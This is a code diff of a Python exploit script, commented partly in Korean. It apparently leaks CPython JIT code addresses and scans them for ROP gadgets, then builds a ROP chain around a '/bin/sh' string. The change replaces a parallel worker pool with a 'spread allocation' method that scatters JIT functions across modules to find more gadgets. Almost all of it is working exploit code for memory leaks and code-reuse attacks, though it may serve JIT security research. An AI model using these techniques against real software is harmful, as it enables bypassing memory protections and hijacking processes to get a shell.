@@ -3,7 +3,7 @@ import ctypes
 import mmap
 import struct
 import json
-from multiprocessing import Pool, Manager
+import types
 from capstone import *
 import jitexecleak
 from libc_gadget_finder import get_runtime_gadget_addresses
@@ -125,31 +125,80 @@ def allocate_binsh():
     ctypes.memmove(addr, binsh_str, len(binsh_str))
     return addr
 
-def worker_task(args):
-    """Worker function for parallel JIT generation and gadget scanning"""
-    seed, magic_value, gadgets_needed = args
+def generate_spread_jit_functions(num_functions, gadgets_needed):
+    """
+    넓은 주소 영역에 JIT 함수 분산 생성 (test_runtime_jit_scan.py 전략)
     
-    print(f"[Worker {seed}] Generating JIT function with magic 0x{magic_value:08X}...")
-    jit_func = generate_jit_func_named(seed, magic_value)
+    전략:
+    1. 여러 모듈 생성 (메모리 할당 경계 분리)
+    2. 각 모듈에 함수 분산 배치
+    3. 1MB 더미로 메모리 영역 강제 분산
+    4. 같은 프로세스 내에서 모든 gadget 주소 유효
+    """
+    num_modules = min(10, num_functions)  # 최대 10개 모듈
+    funcs_per_module = max(1, num_functions // num_modules)
     
-    # Warm up
-    for i in range(5000):
-        jit_func(i)
+    modules = []
+    all_functions = []
+    all_gadgets = {}
     
-    try:
-        jit_addr, size = jitexecleak.leak_executor_jit(jit_func)
-        print(f"[Worker {seed}] JIT @ {hex(jit_addr)}, size: {size}")
-    except RuntimeError as e:
-        print(f"[Worker {seed}] JIT compilation failed: {e}")
-        return {}
+    print(f"\n[*] Generating {num_functions} functions across {num_modules} modules...")
+    print(f"[*] Strategy: Spread allocation in same process")
+    print(f"[*] Expected: Wide address space distribution for diverse patch_64 values")
     
-    blob = (ctypes.c_ubyte * size).from_address(jit_addr)
-    found_gadgets = find_gadgets(jit_addr, bytes(blob), gadgets_needed)
+    for mod_idx in range(num_modules):
+        # 새 모듈 생성 (Python 네임스페이스 분리)
+        module = types.ModuleType(f"jit_spread_module_{mod_idx}")
+        modules.append(module)
+        
+        print(f"\n[Module {mod_idx}] Creating module with {funcs_per_module} functions...")
+        
+        # 각 모듈에 함수 생성
+        for i in range(funcs_per_module):
+            global_idx = mod_idx * funcs_per_module + i
+            if global_idx >= num_functions:
+                break
+                
+            magic_value = MAGIC_VALUES[global_idx % len(MAGIC_VALUES)]
+            
+            print(f"  [{mod_idx}.{i}] Generating function with magic 0x{magic_value:08X}...")
+            jit_func = generate_jit_func_named(global_idx, magic_value)
+            
+            # 모듈에 등록 (메모리 할당 분산 효과)
+            setattr(module, f"func_{i}", jit_func)
+            all_functions.append((global_idx, jit_func, magic_value))
+            
+            # Warm up
+            print(f"  [{mod_idx}.{i}] Warming up...")
+            for j in range(5000):
+                jit_func(j)
+            
+            # JIT 메모리 접근 및 gadget 스캔
+            try:
+                jit_addr, size = jitexecleak.leak_executor_jit(jit_func)
+                print(f"  [{mod_idx}.{i}] ✓ JIT @ {hex(jit_addr)}, size: {size}")
+                
+                blob = (ctypes.c_ubyte * size).from_address(jit_addr)
+                found_gadgets = find_gadgets(jit_addr, bytes(blob), gadgets_needed)
+                
+                for key, addr in found_gadgets.items():
+                    if key not in all_gadgets:
+                        all_gadgets[key] = addr
+                        print(f"  [{mod_idx}.{i}] Found gadget: {key} @ {hex(addr)}")
+                
+            except RuntimeError as e:
+                print(f"  [{mod_idx}.{i}] ✗ JIT compilation failed: {e}")
+        
+        # 메모리 할당 경계 강제 (다음 모듈이 다른 주소에 할당되도록)
+        if mod_idx < num_modules - 1:
+            dummy = bytearray(1024 * 1024)  # 1MB 더미
+            print(f"[Module {mod_idx}] Memory boundary enforced (1MB dummy)")
     
-    for key, addr in found_gadgets.items():
-        print(f"[Worker {seed}] Found gadget: {key} @ {hex(addr)}")
+    print(f"\n[+] Total functions created: {len(all_functions)}")
+    print(f"[+] Functions spread across {len(modules)} modules")
+    print(f"[+] Gadgets found from JIT: {len(all_gadgets)}")
     
-    return found_gadgets
+    return all_gadgets, modules
 
 def execute_rop_chain(gadgets):
     binsh_addr = allocate_binsh()
@@ -209,27 +258,22 @@ def main():
         ("xor", "edx, edx"),
     ]
 
-    # ===== STEP 1: Search in JIT code first =====
-    print("\n[*] Searching for gadgets in JIT code...")
+    # ===== STEP 1: Search in JIT code with SPREAD allocation =====
+    print("\n" + "="*70)
+    print("SPREAD ALLOCATION STRATEGY")
+    print("="*70)
+    print("Goal: Distribute JIT code across wide address space")
+    print("Method: Multiple modules + 1MB dummy boundaries")
+    print("Benefit: Diverse patch_64 values → More unintended instructions")
+    print("="*70)
     
-    # Prepare parallel tasks
-    num_workers = min(len(MAGIC_VALUES), os.cpu_count() or 4)
-    tasks = [(seed, MAGIC_VALUES[seed % len(MAGIC_VALUES)], gadgets_needed) 
-             for seed in range(num_workers)]
+    # 함수 개수 설정 (7개: MAGIC_VALUES 개수만큼)
+    num_functions = len(MAGIC_VALUES)
     
-    print(f"[*] Starting {num_workers} parallel workers...")
+    # Spread allocation으로 JIT 함수 생성 및 gadget 스캔
+    found_gadgets_global, modules = generate_spread_jit_functions(num_functions, gadgets_needed)
     
-    # Run workers in parallel
-    found_gadgets_global = {}
-    with Pool(processes=num_workers) as pool:
-        results = pool.map(worker_task, tasks)
-    
-    # Merge JIT results
-    for result in results:
-        for key, addr in result.items():
-            if key not in found_gadgets_global:
-                found_gadgets_global[key] = addr
-                print(f"[+] JIT: {key} @ {hex(addr)}")
+    print(f"\n[+] JIT gadgets collected: {len(found_gadgets_global)}")
     
     # ===== STEP 2: Check what's missing and search in libc =====
     missing_gadgets = []
